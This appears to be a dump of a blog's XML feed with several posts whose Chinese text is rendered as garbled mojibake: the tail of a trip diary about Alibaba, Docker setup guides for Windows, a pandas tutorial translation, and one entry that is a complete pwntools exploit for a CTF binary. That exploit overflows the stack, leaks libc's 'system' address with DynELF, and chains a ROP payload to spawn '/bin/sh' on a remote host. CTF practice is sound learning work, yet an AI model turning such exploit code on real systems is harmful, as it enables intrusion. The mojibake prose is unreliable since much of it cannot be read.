ä¸‹åˆï¼šå®‰å…¨è”ç›Ÿæ¡ˆä¾‹åŠå…¶ç»éªŒåˆ†äº«&emsp;&emsp;ä¸‹åˆçš„å†…å®¹ï¼Œä¸»è¦æ˜¯æ¥è‡ªè”ç›Ÿçš„åšé›·æ¥åˆ†äº«ä¸€ä¸‹å…³äºŽäº’è”ç½‘å®‰å…¨è”ç›Ÿçš„æ¡ˆä¾‹ã€‚æ¶‰åŠå…·ä½“å·¥ä½œå†…å®¹çš„è¿™é‡Œä¸æ–¹ä¾¿å±•å¼€ã€‚ä½†è®°å¾—å¥¹è¯´è¿‡çš„ä¸€å¥è¯ï¼šè¦å¹²è½°è½°çƒˆçƒˆçš„äº‹ã€‚æœ‰å…±é¸£ï¼Œæœ‰æ„Ÿè§¦ã€‚æœ‰äº›æ—¶å€™çš„è±ªè¨€å£®è¯­ä¼šæ˜¾å¾—å‡å¤§ç©ºï¼Œä¸è¿‡å¯¹æˆ‘è‡ªå·±è€Œè¨€ï¼Œå…³äºŽâ€œè¦åšè½°è½°çƒˆçƒˆçš„äº‹â€çš„æƒ³æ³•å´æ˜¯æ²¡åœè¿‡ï¼Œä¸å¯å¦è®¤æœ‰è¿‡å„ç§å¤±è´¥ï¼Œä¸è¿‡äººè¦æœ‰æ¢¦æƒ³å˜›ï¼Œä¸‡ä¸€å®žçŽ°äº†å‘¢ã€‚å…¶å®žå°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œèº«å¤„äºŽjsjç³»ï¼Œä½†æ·±æ„Ÿæ­¤ç³»èµ„æºä¸è¶³ï¼ŒæŒºï¼ˆå¾ˆï¼‰æƒ³åœ¨ç³»é‡Œå»ºç«‹å„ç§itå…¬å¸äº’è”ç½‘å…¬å¸çš„å„ç§å­¦ç”Ÿä¿±ä¹éƒ¨ï¼Œåƒé˜¿é‡Œå­¦ç”Ÿä¿±ä¹éƒ¨ã€å¾®è½¯å­¦ç”Ÿä¿±ä¹éƒ¨ç­‰ç­‰ï¼Œè™½ç„¶ç§°ä¸ä¸Šè½°è½°çƒˆçƒˆï¼Œä½†è‡³å°‘ä¹Ÿç®—æ˜¯ä¸ªæƒ³æ³•ï¼Œä½†æ„¿æ—¥åŽèƒ½å®žçŽ°å§ï¼åœ¨ä¸‹åˆç»“æŸæ—¶ï¼Œæ…ˆçŽ‰å§ä¹Ÿåˆ†äº«äº†è‡ªå·±çš„ä¼ å¥‡ç»åŽ†ï¼Œå¾ç­‰è†œæ‹œingã€‚ æ™šä¸Šï¼šéš¾å¾—çš„æŠ€æœ¯äº¤æµ&emsp;&emsp;æ™šä¸Šæ˜¯æ™šå®´ã€‚åœ¨æ¯æ¬¡åšæ¸¸æˆä¸­ï¼Œæˆ‘æˆåŠŸåœ°è¾“äº†næ¬¡ç½šäº†næ¯é…’hhã€‚å€¼å¾—ä¸€æçš„æ˜¯ç”±äºŽæˆ‘åå‘æŠ€æœ¯å±‚é¢ï¼Œæ…ˆçŽ‰å§è¿™å‡ å¤©ä¸€ç›´æƒ³è®©æˆ‘ä¸Žè”ç›Ÿçš„ä¸€äº›æŠ€æœ¯äººå‘˜èƒ½æœ‰æ›´å¤šçš„äº¤æµï¼Œå¤ªæ„Ÿè°¢äº†ï¼å½“å¤©çš„æ™šå®´ä¸Šï¼Œï¼ˆæˆ‘è§‰å¾—hhï¼‰æ…ˆçŽ‰å§ç‰¹åœ°æŠŠè”ç›Ÿçš„åæŠ€æœ¯æ–¹å‘çš„éœé‡‘å¤§å“¥å®‰æŽ’åœ¨æˆ‘åº§æ—ã€‚éœé‡‘å¤§å“¥åŽŸæœ¬å°±èŒäºŽè…¾è®¯ï¼ŒåŽæ¥é˜¿é‡Œã€‚åœ¨æŠ€æœ¯æ–¹é¢èƒ½æœ‰æ›´å¤šçš„å…±åŒè¯é¢˜ï¼Œæ‰€ä»¥å’Œéœé‡‘å¤§å“¥ä¸€è·¯ä»ŽCTFèŠåˆ°é˜¿é‡Œäº‘å®‰å…¨ï¼Œä»Žæœ¬ç§‘æ•™è‚²èŠåˆ°èŒä¸šè§„åˆ’ï¼Œæˆ‘ä»Žéœé‡‘å¤§å“¥é‚£é‡ŒèŽ·å¾—äº†è®¸å¤šçš„å»ºè®®ã€‚ 2 æœˆ 17 æ—¥&emsp;&emsp;è¿™ç®—æ˜¯è¡Œç¨‹çš„æœ€åŽä¸€å¤©ï¼Œåå‘äºŽç²¾ç¥žæ–¹å‘ï¼ˆæˆ–è€…è¯´ è™šhhï¼‰ã€‚æ—©ä¸Šç”±æ•™å®˜å¸¦é¢†åšåšå›¢ä½“æ¸¸æˆï¼Œä¸‹åˆåˆ™æ¸¸çŽ©è¥¿æºªæ¹¿åœ°ï¼Œç•¥è¿‡ä¸æï¼Œè¿™é‡Œæ”¾å¼ è¥¿æºªæ¹¿åœ°å…¬å›­çš„ç…§ç‰‡ã€‚ &emsp;&emsp;ç­‰æ¸¸å®Œå…¬å›­å›žåˆ°é˜¿é‡Œå·´å·´æ€»éƒ¨ï¼Œå°±æ˜¯æœ€ç»ˆçš„å°ç»„pkã€‚ä¸¤å¤©çš„å°ç«žäº‰ä¸­ä¸Žå¦ä¸€ç»„å¹¶åˆ—ç¬¬ä¸€ï¼Œä½†åœ¨æœ€åŽçš„åŠ èµ›ä¸­è¾“å•¦ã€‚è€Œè®¸å¤šé«˜æ ¡åŒå­¦åœ¨ç»“æŸåŽç¦»å¼€ï¼Œå‰©ä½™ä¸€äº›åŒå­¦åˆ™å¯ä»¥ç»§ç»­å‚ä¸Žæ™šä¸Šçš„KTVæ´»åŠ¨ï¼Œç„¶åŽæ˜Žå¤©å°±å„å›žå„å®¶å•¦ã€‚ å°ç»“&emsp;&emsp;æ€»ä½“ä¸Šï¼Œæ­¤æ¬¡é˜¿é‡Œä¹‹æ—…ï¼Œå¹²è´§æ»¡æ»¡ã€‚ç¡¬æŠ€æœ¯èƒ½åŠ›å›ºç„¶é‡è¦ï¼Œä¸è¿‡è½¯èƒ½åŠ›è½¯æŠ€èƒ½ä¹Ÿé‡è¦ï¼Œç å†œåœˆä¸­æœ‰å¥è¯ï¼šâ€œTalk is cheapï¼Œshow me the codeã€‚â€æˆ‘è§‰å¾—ï¼Œå¦‚æžœå•ä¼šshowçš„è¯æ˜¯æ— æ³•æŠŠä½ çš„ä»£ç è¯´æ¸…æ¥šçš„ï¼Œè¿™è¿˜éœ€è¦ä½ çš„äº¤é™…è¯­è¨€è¡¨è¾¾èƒ½åŠ›ï¼Œè¿™æ˜¯è½¯æŠ€èƒ½ä¹‹ä¸€ã€‚æ­¤æ¬¡å‰æ¥ï¼Œå’Œè”ç›Ÿä¸­äººå¤§å¤šæ•°çš„äº¤è°ˆæ˜¯åŸºäºŽä¸šåŠ¡æ€§çš„ï¼Œæ˜¯ä¸€ç§å®Œå…¨å­¦ä¹ çš„æ€åº¦ï¼Œå½“ç„¶è‹¥æ˜¯åŸºäºŽæŠ€æœ¯ç±»çš„äº¤è°ˆï¼Œåˆ™ä¼šæ›´åƒæ˜¯äº¤æµã€‚ä¸è¿‡è¿™æ˜¯å°‘æ•°æƒ…å†µhhã€‚åŒæ—¶æ­¤è¡Œä¸­ï¼Œè®¤è¯†äº†éžå¸¸å¤šçš„åŒå­¦ï¼Œåœ¨ä¸¤å¤©çš„å°ç»„pkä¸­é¢†ç•¥äº†ä»–ä»¬çš„è¿‡äººä¹‹å¤„ã€‚ &emsp;&emsp;è¿˜æœ‰å°±æ˜¯éª—äº†å¥½å¤šèµžå“ˆå“ˆ &emsp;&emsp;ä»¥æ­¤æµæ°´è´¦è®°æ­¤æ¬¡é˜¿é‡Œä¹‹è¡Œ]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ ˆæº¢å‡ºå­¦ä¹ ä¹‹bypass ASLR:åˆ©ç”¨DynELFæ¨¡å—leakå‡ºå†…å­˜åœ°å€]]></title>
      <url>%2F2017%2F02%2F16%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%B9%8Bbypass-ASLR-%E5%88%A9%E7%94%A8DynELF%E6%A8%A1%E5%9D%97leak%E5%87%BA%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote('pwn2.jarvisoj.com', 9880)p = remote('218.2.197.235',20433)elf = ELF('./xmanlevel4')writeplt = elf.symbols['write']readplt = elf.symbols['read']vulnaddr = 0x804844bbssaddr = elf.bss(0x200)pppraddr = 0x8048509staraddr = 0x8048350def leak(address): payload = 'a'*140 payload += p32(writeplt) payload += p32(vulnaddr) payload += p32(1) payload += p32(address) payload += p32(4) p.send(payload) data = p.recv(4) print "%#x =&gt; %s " % (address,(data or '').encode('hex')) return datadynelf = DynELF(leak,elf=ELF('./xmanlevel4'))sysaddr = dynelf.lookup('system','libc')print "system address is " + hex(sysaddr)print "-----------------------------------"payload1 = 'a' * 140payload1 += p32(readplt)payload1 += p32(pppraddr)payload1 += p32(0)payload1 += p32(bssaddr)payload1 += p32(8)payload1 += p32(sysaddr)payload1 += p32(1)payload1 += p32(bssaddr)p.send(payload1)p.send('/bin/sh\0')p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[winä¸‹Dockeré»˜è®¤å­˜å‚¨ä½ç½®ä¿®æ”¹]]></title>
      <url>%2F2017%2F02%2F14%2Fwin%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9%2F</url>
      <content type="text"><![CDATA[åœ¨å¦‚å‰å®‰è£…å®ŒdockeråŽï¼Œä¼šæœ‰å¦‚ä¸‹ç•Œé¢ï¼šä¹‹åŽæˆ‘ä»¬ä¼šé€šè¿‡ä¸€ç³»åˆ—çš„å‘½ä»¤æ¥å»ºé€ å®¹å™¨ï¼Œè€Œæ‰€éœ€è¦çš„é•œåƒåˆ™ä¼šè¢«é»˜è®¤å­˜æ”¾åœ¨Cç›˜ä¸­çš„ è™šæ‹Ÿæœºç£ç›˜æ–‡ä»¶disk.vmdkä¸­ï¼Œæ‰€ä»¥ä¸ºé˜²æ­¢ä»¥åŽé•œåƒè¿‡å¤šè€Œå¯¼è‡´çš„Cç›˜ç©ºé—´ä¸è¶³ï¼Œè¦æƒ³åŠžæ³•ä¿®æ”¹ä¸€ä¸‹å­˜å‚¨çš„ä½ç½®ã€‚ ç¬¬ä¸€æ­¥å…ˆåœæŽ‰ docker-machine,å‘½ä»¤è¡Œä¸­è¾“å…¥ docker-machine stop default ç¬¬äºŒæ­¥åœ¨virturalboxç•Œé¢åŒæ—¶æŒ‰ä¸‹ ctrl+D è°ƒå‡ºè™šæ‹Ÿä»‹è´¨ç®¡ç†å™¨ã€‚ çº¢ç®­å¤´æ‰€æŒ‡å³ä¸ºdocker-machineçš„è™šæ‹Ÿç£ç›˜æ–‡ä»¶åœ°å€ã€‚ç‚¹å‡»å³ä¸Šè§’çš„å¤åˆ¶ï¼Œæ ¹æ®æç¤ºæ“ä½œï¼Œä¸ºä¿æŒä¸€è‡´æ€§ï¼Œåœ¨é€‰æ‹©ç£ç›˜æ—¶é€‰æ‹© vmdkç£ç›˜ï¼Œå¹¶é€‰æ‹©ä½ è¦ä½œä¸ºç£ç›˜å­˜æ”¾è·¯å¾„çš„ç›®å½•ã€‚è¿™é‡Œæˆ‘å°†å…¶å¤åˆ¶åˆ°äº† D:\virtualboxVM\docker-machine\disk.vmdk ç¬¬ä¸‰æ­¥è¿”å›žvirtualboxç•Œé¢ï¼ŒæŒ‰ä¸‹ ctrl+s è·³å‡ºå…³äºŽè™šæ‹Ÿæœº default çš„è®¾ç½®ç•Œé¢ã€‚å…ˆç§»é™¤æŽ‰åŽŸæœ¬çš„ disk.vmdk å†ç‚¹é€‰æŽ§åˆ¶å™¨ï¼Œé€‰æ‹©å‡ºçŽ°çš„ä¸¤ä¸ªæŒ‰é’®ä¸­çš„å³è¾¹é‚£ä¸ªï¼šæ·»åŠ è™šæ‹Ÿç¡¬ç›˜é€‰æ‹©â€œä½¿ç”¨çŽ°æœ‰çš„è™šæ‹Ÿç›˜â€ï¼Œå°†ç¬¬äºŒæ­¥ä¸­å¤åˆ¶å‡ºæ¥çš„ç¡¬ç›˜æ–‡ä»¶å¯¼å…¥ã€‚æ·»åŠ å®ŒæˆåŽï¼Œå¦‚ä¸‹ï¼Œå¯ä»¥å‘çŽ°diskçš„è·¯å¾„å·²ç»æ”¹å˜ã€‚ ç¬¬å››æ­¥é‡å¯dockerï¼Œå‘½ä»¤è¡Œä¸­è¾“å…¥ï¼š docker-machine start default å³å¯]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[windowså¹³å°ä¸‹DockerçŽ¯å¢ƒæ­å»º]]></title>
      <url>%2F2017%2F02%2F13%2Fwindows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
      <content type="text"><![CDATA[ç”±äºŽå‡†å¤‡è‡ªå·±å†™ä¸ªè™šæ‹Ÿæœºï¼Œä»¥åŠæ—¥åŽctfé¢˜çŽ¯å¢ƒçš„æ­å»ºç­‰ï¼Œå‡†å¤‡å¼€å§‹æŽ¥è§¦dockerã€‚ç›¸æ¯”äºŽvmwareç­‰è™šæ‹Ÿæœºè½¯ä»¶ï¼Œdockerèƒ½å¾ˆå¥½çš„åšå‡ºä¸€ä¸ªéš”ç¦»linuxçš„çŽ¯å¢ƒï¼Œå¹¶ä¸”å®ƒèƒ½ç›´æŽ¥è°ƒç”¨ç‰©ç†æœºç¡¬ä»¶ï¼Œè€Œä¸åƒvmwareæ˜¯è‡ªå·±è™šæ‹ŸåŒ–ç¡¬ä»¶ï¼Œè¿™æ ·åœ¨dockerå®¹å™¨é‡Œè·‘cudaè°ƒç”¨æœ¬æœºçš„æ˜¾å¡å°±æœ‰å¯èƒ½äº†ã€‚ä¸‹é¢è®°å½•ä¸€ä¸‹è‡ªå·±çš„dockeræ­å»ºè¿‡ç¨‹ã€‚ ä¸‹è½½winä¸‹æˆ‘ä»¬ä¸€èˆ¬ç›´æŽ¥é€‰æ‹© Docker Toolbox æ³•ä¸€dockerçš„å®˜ç½‘ï¼šä¸‹è½½åœ°å€ä½†å®˜ç½‘ä¸‹è½½ä¼šå¾ˆæ…¢ï¼Œç”šè‡³ä¸‹è½½äº†å¥½ä¹…çªç„¶é—´å¤±è´¥hh æ³•äºŒé•œåƒç«™ï¼šä¸‹è½½åœ°å€é€Ÿåº¦å¿«ï¼Œä½†ç‰ˆæœ¬çš„æ›´æ–°é—®é¢˜å•¥çš„è‡ªå·±æ³¨æ„ã€‚ å®‰è£…ä¸‹è½½çš„exeæ‰“å¼€ï¼Œä¸€è·¯è·Ÿç€æç¤ºèµ°ã€‚ å¯ä»¥è‡ªå·±é€‰æ‹©å®‰è£…ä½ç½®,ä½†è¦è®°ä½ã€‚åŽé¢è¦ç”¨åˆ°ã€‚è¿™é‡Œä¸º D:\Docker Toolbox æ³¨æ„éœ€è¦å®‰è£…virtualboxï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯åœ¨winå¹³å°ä¸‹å®‰è£…dockerï¼Œè€Œdockeræ˜¯é«˜åº¦ä¾èµ–linuxçš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦virtualboxï¼ˆå¼€æºå…è´¹ï¼‰æ¥æä¾›winå¹³å°ä¸‹linuxå†…æ ¸çš„æŽ¥å£ä¸Žç‰¹æ€§ éœ€è¦å®‰è£…git for windowsï¼Œè‹¥åŽŸæœ¬æœºå­ä¸­å·²ç»æœ‰äº†ï¼Œå¯ä»¥å‹¾æŽ‰ä¸é€‰æ‹©ã€‚ kitematicæ˜¯dockerçš„GUIå·¥å…·ï¼Œä¹Ÿé¡ºä¾¿å®‰äº†å§ã€‚ä¸è¿‡ä¸€èˆ¬å’±éƒ½æ˜¯ç”¨å‘½ä»¤è¡Œçš„å˜›ã€‚ è€å¿ƒç­‰å¾…å®‰è£…è¿‡ç¨‹ç»“æŸ åˆæ¬¡å¯åŠ¨å®‰è£…å®ŒæˆåŽï¼Œæ¡Œé¢ä¸Šä¼šå¤šå‡ºä¸‰ä¸ªå›¾æ ‡ Oracle VM VirtualBox Kitematic (Alpha) Docker Quickstart Terminal è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å…ˆæ‰“å¼€ï¼ˆåŒå‡»ï¼‰ç¬¬ä¸‰ä¸ªã€‚ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶ï¼Œé»‘å±å¹•ä¸Šåªæœ‰å…‰æ ‡ï¼Œå¯èƒ½éœ€è¦å…ˆæ‰“ä¸€ä¸ªå›žè½¦ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å¦‚ä¸‹ï¼š å¯èƒ½ç­‰å¾ˆä¹…éƒ½æ²¡æœ‰ååº”ï¼Œæˆ‘è¯´çš„æ˜¯ â€œå¯èƒ½â€hhæ³¨æ„åˆ°é‡Œé¢çš„æ„æ€æ˜¯è¦æŠŠ boot2docker ä¸‹è½½ä¸‹æ¥ï¼Œè®°ä½ä¸‹è½½è·¯å¾„ï¼š C:\Users\ASUS\.docker\machine\cache æ‰“å¼€dokcerçš„å®‰è£…è·¯å¾„ï¼ˆä»¥æˆ‘çš„å®‰è£…è·¯å¾„ä¸ºä¾‹ï¼‰D:\Docker Toolboxå°†é‡Œé¢çš„ boot2docker.iso æ‹·è´åˆ° ä¸‹è½½è·¯å¾„é‡Œ å›žåˆ°æ¡Œé¢è¿è¡Œ Docker Quickstart Terminalï¼Œå¯èƒ½éœ€è¦å†æŒ‰ä¸€æ¬¡å›žè½¦ ç­‰â€œå®‰è£…â€å®Œæˆï¼ŒæŽ§åˆ¶å°ä¼šå‡ºçŽ°ï¼š å®ŒæˆåŽæœ€å¥½é‡å¯ä¸€ä¸‹è¿™æ ·å°±è¡Œå•¦ã€‚ å¯èƒ½çš„é—®é¢˜åˆå§‹åŒ–é—®é¢˜è§£å†³æ–¹æ³•ï¼šå°† virtualbox å’Œ docker å¸è½½æŽ‰ï¼Œé‡å¯ï¼Œå†é‡æ–°å®‰è£… Terminalä¸€ç›´è‡ªåŠ¨å…³é—­è§£å†³æ–¹æ³•ï¼šé‡å¯ç”µè„‘â€¦â€¦]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ5ï¼‰ten Minutes to pandasä¸­æ–‡ç‰ˆä¸‹]]></title>
      <url>%2F2017%2F02%2F02%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B%2F</url>
      <content type="text"><![CDATA[æ­¤æ–‡æ˜¯ ten-Minutes-to-pandas ä¸‹åŠéƒ¨åˆ†çš„ç¿»è¯‘ã€‚ä¸ŠåŠéƒ¨åˆ†è¯·çœ‹ï¼šã€Šæ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ4ï¼‰ten Minutes to pandasä¸­æ–‡ç‰ˆä¸Šã€‹ç´§æŽ¥ä¸Šæ–‡çš„æ•°æ®ï¼Œå¦‚ä¸‹ï¼šä»¥ä¸‹ä¸‹åŠéƒ¨åˆ†æ­£æ–‡å¼€å§‹ï¼š æ“ä½œï¼ˆOperationsï¼‰æ›´å¤šå†…å®¹è¯·çœ‹ï¼šã€ŠBasic section on Binary Opsã€‹ ç»Ÿè®¡ï¼ˆStatsï¼‰é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™äº›æ“ä½œçš„å¯¹è±¡ä¸åŒ…æ‹¬ç¼ºå¤±å€¼ æè¿°æ€§ç»Ÿè®¡ä¿¡æ¯1df.mean() æŒ‡å®šè½´å‘åœ¨å…¶ä»–è½´ä¸Šæ‰§è¡Œç›¸åŒæ“ä½œ1df.mean(1) è‡ªåŠ¨å¯¹åº”ç»´åº¦å¯¹å…·æœ‰ä¸åŒç»´åº¦å’Œéœ€è¦å¯¹é½çš„å¯¹è±¡æ“ä½œæ—¶ï¼Œpandasä¼šè‡ªåŠ¨åœ°æ²¿ç€ç‰¹å®šçš„ç»´åº¦è¿›è¡Œå¹¿æ’­ï¼ˆæ³¨ï¼šå…¶å®žå°±æ˜¯è¿ç®—å•¦ï¼‰123# å‡†å¤‡å·¥ä½œs = pd.Series([1,3,5,np.nan,6,8], index=dates).shift(2)s ï¼ˆæ³¨ï¼š.shiftæ“ä½œä¼šå¯¹æ•°æ®è¿›è¡Œç§»åŠ¨ï¼Œç©ºå‡ºçš„ä½ç½®ç”¨nanä»£æ›¿ï¼‰ 1df.sub(s, axis='index') ï¼ˆæ³¨ï¼š .sub è¡¨ç¤º å‡åŽ» ï¼‰ å‡½æ•°åº”ç”¨ï¼ˆApplyï¼‰æŠŠå‡½æ•°åº”ç”¨åˆ°æ•°æ®ä¸Š ä½¿ç”¨å·²æœ‰å‡½æ•°1df.apply(np.cumsum) ï¼ˆæ³¨ï¼šnp.cumsumçš„ä½¿ç”¨æ–¹æ³•ï¼‰ ä½¿ç”¨åŒ¿åå‡½æ•°1df.apply(lambda x: x.max() - x.min()) ï¼ˆæ³¨ï¼šlambdaè¡¨è¾¾å¼ï¼Œå»ºè®®ç™¾åº¦ï¼‰ ç›´æ–¹å›¾ï¼ˆHistogrammingï¼‰æ›´å¤šå†…å®¹è¯·æŸ¥é˜… ã€ŠHistogramming and Discretizationã€‹123# å‡†å¤‡å·¥ä½œs = pd.Series(np.random.randint(0, 7, size=10))s 1s.value_counts() ï¼ˆæ³¨ï¼šHistogrammingç¿»è¯‘è¿‡æ¥æ˜¯å«ç›´æ–¹å›¾ã€‚è¿™é‡Œvalue_countsè¿”å›žçš„æ•°æ®ä¸­è¯´æ˜Žäº† 5 å‡ºçŽ°äº† 3 æ¬¡ï¼Œ 2 å‡ºçŽ°äº† 2 æ¬¡ç­‰ç­‰ï¼Œè™½æ— å›¾å½¢ï¼Œä½†å®žé™…ä¸Šå´æ˜¯æ˜¯ç›´æ–¹å›¾çš„è¡¨ç¤ºï¼‰ å­—ç¬¦ä¸²æ–¹æ³•ï¼ˆString Methodsï¼‰Serieså¯¹è±¡çš„ strå±žæ€§ ä¸­é›†æˆäº†ä¸€ç³»åˆ—ç”¨äºŽå¤„ç†å­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼Œèƒ½å¤Ÿå¾ˆæ–¹ä¾¿å¯¹å¯¹è±¡ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡Œå¤„ç†ã€‚æ³¨æ„åˆ°ï¼Œé€šå¸¸æƒ…å†µä¸‹åœ¨ strå±žæ€§ä¸­çš„ æ¨¡å¼åŒ¹é…ï¼ˆpattern-matchingï¼‰é»˜è®¤ä½¿ç”¨äº† æ­£åˆ™è¡¨è¾¾å¼ï¼ˆregular expressionsï¼‰ã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜… ã€ŠVectorized String Methodsã€‹ 123# å‡†å¤‡å·¥ä½œs = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat'])s 12# .loewr() è½¬æ¢æˆå°å†™å­—æ¯s.str.lower() æ•°æ®åˆå¹¶ï¼ˆMergeï¼‰å°±åˆå¹¶ç±»æ“ä½œï¼ˆjoin / merge-type operationsï¼‰è€Œè¨€ï¼Œpandasæä¾›äº†å„ç§å·¥å…·èƒ½æ–¹ä¾¿åœ°å¯¹Seriesï¼ŒDataFrameï¼Œå’Œ Panelå¯¹è±¡ è¿›è¡Œå„ç§é€»è¾‘æ¼”ç®—æ¥è¿›è¡Œæ•°æ®åˆå¹¶ ã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜…ã€ŠMerging sectionã€‹ï¼ˆæ³¨ï¼šä¸Šé¢è¿™æ®µè¯åœ¨åŽŸæ–‡ä¸­æ”¾åœ¨concatçš„å¼€å¤´ï¼Œä¸ºé€»è¾‘å’Œç»“æž„ä¸Šçš„å®Œæ•´å’Œæµç•…ï¼Œæˆ‘è¿™é‡Œæ”¾åˆ°äº†è¿™è¾¹ï¼‰ Concatç”¨ concat() æŠŠpandaså¯¹è±¡è”ç³»ï¼ˆConcatenatingï¼‰èµ·æ¥123# å‡†å¤‡å·¥ä½œdf = pd.DataFrame(np.random.randn(10, 4))df 123# å‡†å¤‡å·¥ä½œ2ï¼šæŠŠåˆšåˆšç”Ÿæˆçš„dfåˆ†ç‰‡ï¼ˆbreak it into piecesï¼‰pieces = [df[:3], df[3:7], df[7:]]pieces 12# ä½¿ç”¨concat()è¿žæŽ¥pd.concat(pieces) JoinSQLå½¢å¼çš„è¿žæŽ¥ã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜…ã€ŠDatabase style joiningã€‹ ç¤ºä¾‹ä¸€123# å‡†å¤‡å·¥ä½œ1left = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'lval': [1, 2]&#125;)left 123# å‡†å¤‡å·¥ä½œ2right = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'rval': [4, 5]&#125;)right 12# ä½¿ç”¨ merge() è¿žæŽ¥pd.merge(left, right, on='key') ç¤ºä¾‹äºŒå¦ä¸€ä¸ªä¾‹å­å¦‚ä¸‹ï¼š123# å‡†å¤‡å·¥ä½œ1left = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'lval': [1, 2]&#125;)left 123# å‡†å¤‡å·¥ä½œ2right = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'rval': [4, 5]&#125;)right 1pd.merge(left, right, on='key') Appendå‘ dataframeå¯¹è±¡æ·»åŠ è¡Œã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜… ã€ŠAppendingã€‹ 123# å‡†å¤‡å·¥ä½œ1df = pd.DataFrame(np.random.randn(8, 4), columns=['A','B','C','D'])df 123# å‡†å¤‡å·¥ä½œ2s = df.iloc[3]s 12# ä½¿ç”¨ appenddf.append(s, ignore_index=True) åˆ†ç»„ï¼ˆGroupingï¼‰å¯¹åˆ†ç»„æ“ä½œï¼Œæˆ‘ä»¬æŒ‡çš„æ˜¯åŒ…å«ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªæ­¥éª¤çš„è¿‡ç¨‹ï¼š æ ¹æ®æŸäº›æ ‡å‡†æŠŠæ•°æ®åˆ‡åˆ†ï¼ˆSplittingï¼‰æˆä¸åŒç»„åˆ« ç»™æ¯ä¸ªç»„åˆ«ç‹¬ç«‹åœ°åº”ç”¨ï¼ˆApplyingï¼‰å‡½æ•° å°†ç»“æžœç»„åˆï¼ˆCombiningï¼‰æˆåŒä¸€æ•°æ®ç»“æž„ æ›´å¤šå†…å®¹è¯·æŸ¥çœ‹ ã€ŠGrouping sectionã€‹ 12345678# å‡†å¤‡å·¥ä½œdf = pd.DataFrame(&#123;'A' : ['foo', 'bar', 'foo', 'bar', ....: 'foo', 'bar', 'foo', 'foo'], ....: 'B' : ['one', 'one', 'two', 'three', ....: 'two', 'two', 'one', 'three'], ....: 'C' : np.random.randn(8), ....: 'D' : np.random.randn(8)&#125;)df ä¸€åˆ—åˆ†ç»„ï¼Œç„¶åŽå¯¹å„ä¸ªåˆ†ç»„ç»“æžœåº”ç”¨å‡½æ•°ï¼ˆsumï¼‰1df.groupby('A').sum() å¤šåˆ—æ ¹æ®å¤šåˆ—åˆ†ç»„ï¼Œå½¢æˆå±‚æ¬¡ç´¢å¼•ï¼Œä»Žè€Œå¯ä»¥å¯¹å…¶ä½¿ç”¨å‡½æ•°ã€‚1df.groupby(['A','B']).sum() æ•°æ®é‡ç»„ï¼ˆReshapingï¼‰æ›´å¤šå†…å®¹è¯·æŸ¥çœ‹ ã€ŠHierarchical Indexingã€‹ å’Œ ã€ŠReshapingã€‹ Stack123456789# å‡†å¤‡å·¥ä½œtuples = list(zip(*[['bar', 'bar', 'baz', 'baz', ....: 'foo', 'foo', 'qux', 'qux'], ....: ['one', 'two', 'one', 'two', ....: 'one', 'two', 'one', 'two']]))index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second'])df = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B'])df2 = df[:4]df2 12stacked = df2.stack()stacked å¯¹äºŽä¸€ä¸ª â€œstackedâ€ çš„ DataFrame æˆ–è€… Series å¯¹è±¡ ï¼ˆå®ƒä»¬çš„ç´¢å¼•æ˜¯å±‚æ¬¡ç´¢å¼•ï¼‰ï¼Œstackï¼ˆï¼‰æ“ä½œçš„é€†æ“ä½œæ˜¯ unstackï¼ˆï¼‰ï¼Œå®ƒé»˜è®¤æƒ…å†µä¸‹åªå¤„ç†æœ«çº§å±‚æ¬¡çš„ç´¢å¼•ã€‚ 1stacked.unstack() 1stacked.unstack(1) 1stacked.unstack(0) æ•°æ®é€è§†è¡¨ï¼ˆPivot Tablesï¼‰æ›´å¤šå†…å®¹è¯·æŸ¥é˜… Pivot Tables 1234567# å‡†å¤‡å·¥ä½œdf = pd.DataFrame(&#123;'A' : ['one', 'one', 'two', 'three'] * 3, .....: 'B' : ['A', 'B', 'C'] * 4, .....: 'C' : ['foo', 'foo', 'foo', 'bar', 'bar', 'bar'] * 2, .....: 'D' : np.random.randn(12), .....: 'E' : np.random.randn(12)&#125;)df æˆ‘ä»¬å¯ä»¥å¾ˆç®€ä¾¿åœ°ä»Žæ•°æ®ä¸­å¾—åˆ°æ•°æ®é€è§†è¡¨1pd.pivot_table(df, values='D', index=['A', 'B'], columns=['C']) 